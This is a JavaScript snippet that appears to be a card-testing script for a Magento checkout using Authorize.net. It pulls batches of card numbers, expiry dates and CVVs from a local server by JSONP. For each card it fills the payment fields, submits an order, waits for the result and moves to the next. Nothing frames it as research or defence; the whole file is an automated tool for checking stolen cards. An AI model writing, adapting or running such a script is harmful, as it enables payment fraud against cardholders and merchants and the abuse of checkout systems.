var url = "http://localhost:5000/post";
var iteration = null;
var jsonp_callback = function(arr) {
	var i = 0;
	var len = arr.length;

	iteration = function() {
	  if( i < len ) {
	    var json = arr[i++];
      sessionStorage.card = JSON.stringify(json);

      $("authorizenet_directpost_cc_type").value = json.card[0] == "4" ? "VI" : "MC";
      $("authorizenet_directpost_cc_number").value = json.card;
      $("authorizenet_directpost_expiration").value = Number(json.mon);
      $("authorizenet_directpost_expiration_yr").value = "20" + json.year;
      $("authorizenet_directpost_cc_cid").value = json.cvv;
      $("aw-onestepcheckout-place-order-button").click();
      var loading = $("aw-onestepcheckout-place-order-overlay");
      var interval = setInterval(function() {
        console.log("Procesando...")
        if ( loading.style.display == "none" ) {
          console.log("Probemos la proxima");
          clearInterval(interval);
          setTimeout(iteration, 10000);
        }
      }, 1000);
	  }
	  else {
	    jQuery.ajax({
        url:url,
        dataType: "jsonp"
      });
	  }
	}

	iteration();
};
// MakeUp
jQuery.ajax({
     url:url,
     dataType: "jsonp"
});